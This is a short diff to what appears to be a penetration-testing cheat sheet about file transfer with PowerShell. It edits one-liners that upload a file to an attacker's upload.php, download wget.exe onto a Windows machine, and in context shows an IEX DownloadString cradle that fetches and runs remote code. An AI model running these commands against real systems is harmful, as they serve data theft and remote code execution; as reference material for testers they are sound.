@@ -137,7 +137,7 @@ Client
 PowerShell
 
 ``` bash
-powershell.exe (New-Object System.Net.WebClient).UploadFile('http://ip/upload.php', 'test.txt')
+(New-Object System.Net.WebClient).UploadFile('http://ip/upload.php', 'test.txt')
 ```
 
 curl
@@ -239,7 +239,7 @@ powershell.exe IEX (New-Object System.Net.WebClient).DownloadString('http://ip/r
 Windows machine
 
 ``` bash
-powershell -c "(new-object System.Net.WebClient).DownloadFile('http://ip/wget.exe','C:\Users\Public\Desktop\wget.exe')"
+(new-object System.Net.WebClient).DownloadFile("http://192.168.11.145/wget.exe","C:\Users\Public\wget.exe")
 ```
 
 === "ps1 script"
